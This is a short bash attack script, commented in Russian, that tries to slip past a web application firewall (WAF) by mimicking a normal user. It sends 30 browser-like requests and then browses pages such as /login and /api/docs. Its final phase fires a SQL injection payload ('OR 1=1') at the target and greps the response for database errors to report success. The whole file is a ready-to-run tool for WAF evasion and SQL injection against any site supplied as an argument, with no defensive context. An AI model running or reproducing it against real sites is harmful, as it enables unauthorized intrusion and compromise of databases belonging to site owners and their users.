#!/bin/bash
# Реверсивный психолог — обход WAF через доверие
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "[PSYCHO] Усыпляю бдительность WAF..."

# Фаза 1: Нормальное поведение (30 запросов)
echo "[PSYCHO] Фаза 1: Нормальный пользователь..."
for i in {1..30}; do
    curl -sk --max-time 5 \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0" \
        -H "Accept: text/html,application/xhtml+xml" \
        -H "Accept-Language: en-US,en;q=0.9" \
        "$TARGET" -o /dev/null 2>/dev/null
    sleep 0.$((RANDOM % 10))
done

# Фаза 2: Легитимные переходы
echo "[PSYCHO] Фаза 2: Переходы по ссылкам..."
for page in / /about /contact /login /api/docs; do
    curl -sk --max-time 5 \
        -H "Referer: $TARGET" \
        "$TARGET$page" -o /dev/null 2>/dev/null
    sleep 1
done

# Фаза 3: WAF думает что мы свой — атакуем
echo "[PSYCHO] Фаза 3: WAF спит — АТАКУЮ!"
curl -sk --max-time 5 "$TARGET?id=1' OR '1'='1" -o /tmp/psycho_test.html 2>/dev/null
grep -qi "error\|syntax\|sql\|mysql" /tmp/psycho_test.html && echo "  💉 SQLi ПРОШЛА!" || echo "  🛡️ WAF не спит"

echo "[PSYCHO] Операция завершена"
